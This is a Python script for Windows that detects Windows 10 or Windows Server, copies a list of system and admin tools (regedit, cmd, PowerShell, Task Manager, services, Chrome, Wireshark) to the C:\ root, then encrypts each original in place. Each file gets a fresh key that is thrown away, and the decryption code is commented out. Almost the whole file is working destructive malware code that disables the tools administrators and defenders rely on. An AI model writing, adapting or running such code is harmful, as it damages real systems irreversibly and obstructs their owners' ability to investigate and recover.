import os 
from cryptography.fernet import Fernet
import platform
import shutil

COPYFOLDER = 'C:\\'
BLACKLIST_WINTEN = ['C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\calc.exe','C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\control.exe', 'C:\\Windows\\System32\\find.exe', 'C:\\Windows\\System32\\gpupdate.exe', 'C:\\Windows\\System32\\ipconfig.exe', 'C:\\Windows\\System32\\mmc.exe', 'C:\\Windows\\System32\\msconfig.exe', 'C:\\Windows\\System32\\notepad.exe', 'C:\\Windows\\System32\\perfmon.msc', 'C:\\Windows\\System32\\PING.exe', 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\System32\\taskkill', 'C:\\Windows\\System32\\Taskmgr.exe', 'C:\\Windows\\System32\\taskschd.msc', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Local App Data\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Wireshark\\Wireshark.exe']
BLACKLIST_WINSERV = ['C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\ServerManager.exe', 'C:\\Windows\\regedit.exe', 'C:\\Windows\\System32\\calc.exe','C:\\Windows\\System32\\cmd.exe', 'C:\\Windows\\System32\\conhost.exe', 'C:\\Windows\\System32\\control.exe', 'C:\\Windows\\System32\\find.exe', 'C:\\Windows\\System32\\gpupdate.exe', 'C:\\Windows\\System32\\ipconfig.exe', 'C:\\Windows\\System32\\mmc.exe', 'C:\\Windows\\System32\\msconfig.exe', 'C:\\Windows\\System32\\notepad.exe', 'C:\\Windows\\System32\\perfmon.msc', 'C:\\Windows\\System32\\PING.exe', 'C:\\Windows\\System32\\services.exe', 'C:\\Windows\\System32\\taskkill', 'C:\\Windows\\System32\\Taskmgr.exe', 'C:\\Windows\\System32\\taskschd.msc', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Local App Data\\Google\\Chrome\\Application\\chrome.exe', 'C:\\Program Files\\Wireshark\\Wireshark.exe']

def check_windows_version():
    system_info = platform.system()
    if system_info == "Windows":
        version_info = platform.version()
        if "10.0" in version_info:
            return "Windows 10"
        elif "Server" in version_info:
            return "Windows Server"
        else:
            return "Unknown Windows Version"
    else:
        return "Not a Windows System"

def copy_file(source_path, destination_path):
    try:
        shutil.copy2(source_path, destination_path)
        print("File copied successfully.")
    except Exception as e:
        print(f"Error: {e}")

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Encrypt all files in the dictionary using the provided key
#def encrypt_files(file_dict, encryption_key):
#    for file_path in file_dict.values():
#        encrypt_file(file_path, encryption_key)

#def decrypt_file(file_path, key):
#    with open(file_path, 'rb') as file:
#        encrypted_data = file.read()
#    fernet = Fernet(key)
#    decrypted_data = fernet.decrypt(encrypted_data)
#    with open(file_path, 'wb') as file:
#       file.write(decrypted_data)

# Decrypt all files in the dictionary using the provided key
#def decrypt_files(file_dict, encryption_key):
#    for file_path in file_dict.values():
#        decrypt_file(file_path, encryption_key)


if __name__ == "__main__":
    version = check_windows_version()
    if version == "Windows 10":
        for file in BLACKLIST_WINTEN:
            try:
                copy_file(file, COPYFOLDER)
                encrypt_file(file, generate_key())
            except Exception:
                continue
    elif version == "Windows Server":
        for file in BLACKLIST_WINSERV:
            try:
                copy_file(file, COPYFOLDER)
                encrypt_file(file, generate_key())
            except Exception:
                continue
    else: 
        exit()